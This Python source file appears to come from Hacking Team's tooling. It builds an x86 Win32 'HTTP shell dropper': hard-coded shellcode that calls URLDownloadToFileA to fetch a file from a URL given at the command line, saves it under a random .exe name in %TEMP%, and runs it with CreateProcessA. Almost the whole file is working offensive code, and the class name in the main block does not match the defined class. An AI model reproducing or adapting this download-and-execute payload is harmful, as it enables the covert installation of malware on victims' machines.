#! /usr/bin/env python

#Copyright HT srl, 2009-2010
#http://www.hackingteam.it/ for more information

#cod

"""
HTTP Shellcode dropper
Drop in %TEMP% folder an attachment  file and run it

Parameters:
	length:DWORD		-> Size of attachment
	filename:BYTE[12]	-> File name to drop
	buffer:BYTE[?]		-> Attachment data

Shellcode available in source format in /shellcode/shelldrop/shelldrophttp.asm
"""

VERSION = "1.0"

NAME="x86shelldrop"
DESCRIPTION="x86 HTTP Shell Dropper for win32"
DOCUMENTATION={}
DOCUMENTATION["VENDOR"] = "HT srl"
DOCUMENTATION["Repeatability"] = "One shot"
DOCUMENTATION["Author"] = "cod"
DOCUMENTATION["Notes"] = ""

import os
import sys
import struct
from random import *

class x86shelldrophttp:

	shellcode = ""
	r = None
	
	"""
	initialize object (shellcode and Random object)
	"""
	def __init__(self):
		self.r = Random()
		self.r.seed()

		self.shellcode += "\xE8\x00\x00\x00\x00\x58\x2D\x05\x00\x00\x00\x8B\xEC\x83\xEC\x40"
		self.shellcode += "\x89\x45\xFC\x6A\x30\x58\x64\x8B\x00\x8B\x40\x0C\x8B\x40\x0C\x6A"
		self.shellcode += "\x02\x59\x8B\x00\xE2\xFC\x8B\x40\x18\x89\x45\xF8\x8B\x48\x3C\x03"
		self.shellcode += "\xC8\x8B\x49\x78\x03\xC8\x51\xFF\x75\xF8\xE8\x7E\x00\x00\x00\x89"
		self.shellcode += "\x45\xF4\x8B\x5D\xFC\x89\x45\xE0\xBB\x90\x01\x00\x00\x03\x5D\xFC"
		self.shellcode += "\x8B\xF3\xB9\x04\x00\x00\x00\x51\x66\xAD\x98\x03\x45\xFC\x50\xFF"
		self.shellcode += "\x75\xF8\xE8\xBD\x00\x00\x00\x59\x8B\xD8\x66\xAD\x98\x03\xC5\x89"
		self.shellcode += "\x18\xE2\xE4\xB8\x89\x01\x00\x00\x03\x45\xFC\x50\xE8\xAF\x00\x00"
		self.shellcode += "\x00\x8B\xD8\xB8\x76\x01\x00\x00\x03\x45\xFC\x50\x53\xE8\x92\x00"
		self.shellcode += "\x00\x00\x89\x45\xC0\xE9\x26\x01\x00\x00\x51\x56\x68\x64\x64\x72"
		self.shellcode += "\x65\x68\x72\x6F\x63\x41\x68\x47\x65\x74\x50\x8B\xF4\x33\xC9\x83"
		self.shellcode += "\xC9\x03\xF3\xA7\x0F\x94\xC0\x83\xC4\x0C\x5E\x59\xC3\x55\x8B\xEC"
		self.shellcode += "\x56\x51\x57\x8B\x75\x0C\x8B\x4E\x18\x03\x7D\x08\x8B\x46\x20\x03"
		self.shellcode += "\x45\x08\x33\xFF\x50\x57\x8B\x38\x03\x7D\x08\xE8\xBA\xFF\xFF\xFF"
		self.shellcode += "\x3C\x01\x5F\x58\x74\x08\x83\xC0\x04\x47\xE2\xE8\xEB\x20\x03\x7E"
		self.shellcode += "\x10\x8B\xCF\x8B\x7E\x24\x03\x7D\x08\x0F\xB7\x0C\x4F\x2B\x4E\x10"
		self.shellcode += "\x8B\x7E\x1C\x03\x7D\x08\x8B\x04\x8F\x03\x45\x08\xEB\x0D\x33\xC0"
		self.shellcode += "\x8B\xFC\xB9\x40\x00\x00\x00\xF3\xAB\xFF\xE0\x5F\x59\x5E\x8B\xE5"
		self.shellcode += "\x5D\xC2\x08\x00\xFF\x65\xE0\xFF\x65\xD0\xFF\x65\xCC\xFF\x65\xC8"
		self.shellcode += "\xFF\x65\xC4\xFF\x65\xC0\x43\x72\x65\x61\x74\x65\x50\x72\x6F\x63"
		self.shellcode += "\x65\x73\x73\x41\x00\x47\x65\x74\x45\x6E\x76\x69\x72\x6F\x6E\x6D"
		self.shellcode += "\x65\x6E\x74\x56\x61\x72\x69\x61\x62\x6C\x65\x41\x00\x45\x78\x69"
		self.shellcode += "\x74\x50\x72\x6F\x63\x65\x73\x73\x00\x4C\x6F\x61\x64\x4C\x69\x62"
		self.shellcode += "\x72\x61\x72\x79\x41\x00\x55\x52\x4C\x44\x6F\x77\x6E\x6C\x6F\x61"
		self.shellcode += "\x64\x54\x6F\x46\x69\x6C\x65\x41\x00\x75\x72\x6C\x6D\x6F\x6E\x00"
		self.shellcode += "\x36\x01\xD0\xFF\x45\x01\xCC\xFF\x5D\x01\xC8\xFF\x69\x01\xC4\xFF"
		self.shellcode += "\x52\x8B\xD4\x83\xEC\x20\x52\x33\xC0\x50\x50\xFF\x72\x0C\xFF\x72"
		self.shellcode += "\x08\x50\xFF\x55\xC0\x5A\x85\xC0\x5F\x5E\x8B\xE2\x5A\xC2\x08\x00"
		self.shellcode += "\x81\xEC\x00\x01\x00\x00\x8B\xC4\xC7\x00\x54\x45\x4D\x50\xC7\x40"
		self.shellcode += "\x04\x00\x00\x00\x00\x68\xF8\x00\x00\x00\x50\x83\x04\x24\x08\x50"
		self.shellcode += "\xE8\x45\xFF\xFF\xFF\x8B\xFC\x83\xC7\x08\xB9\x00\x01\x00\x00\x33"
		self.shellcode += "\xC0\xF2\xAE\xB0\x5C\x4F\xAA\xB9\x03\x00\x00\x00\xBE\x5C\x02\x00"
		self.shellcode += "\x00\x03\x75\xFC\xF3\xA5\x32\xC0\x88\x07\x8B\xC4\x83\xC0\x08\x50"
		self.shellcode += "\xB8\x68\x02\x00\x00\x03\x45\xFC\x50\xE8\x82\xFF\xFF\xFF\x8B\xD4"
		self.shellcode += "\x83\xC2\x08\x83\xEC\x10\x8B\xDC\x83\xEC\x44\x8B\xFC\xB9\x11\x00"
		self.shellcode += "\x00\x00\x33\xC0\xF3\xAB\x8B\xFC\xC7\x07\x44\x00\x00\x00\x53\x57"
		self.shellcode += "\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x52\xE8"
		self.shellcode += "\xD3\xFE\xFF\xFF\x33\xC0\x50\xE8\xD1\xFE\xFF\xFF"

	"""
	return a random char from a range
	"""
	def getrandchar(self):
		chars = "q0w1e2r3t4y5u6i7o8p9a_sdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
		i = self.r.randint(0, len(chars)-1)
		return chars[i]

	
		"""
	return a file name (random dot exe)
	"""
	def randfilename(self):
		newfilename = ""
		
		for i in range(7):
			newfilename += struct.pack('c', self.getrandchar())
		
		newfilename += struct.pack('cccc', '.', 'e', 'x', 'e')
		
		return newfilename
	
	"""
	attach a file to shellcode and return an array (binary string)
	"""
	def get(self, urlhttp):
		outshellcode = self.shellcode
		outshellcode += self.randfilename() + "\x00"
		outshellcode += urlhttp + "\x00"
		
		return outshellcode
		
if __name__ == "__main__":
	print "x86 HTTP Shell Dropper/win32 platform"
	
	print "Loading file 1"
	
	myclass = x86shelldrop()
	
	print "Opening file ", sys.argv[1]
	outdata = myclass.get(sys.argv[1])
	
	outstream = open(sys.argv[2], 'wb')
	outstream.write(outdata)
	outstream.close()
	
	print "Block completed"
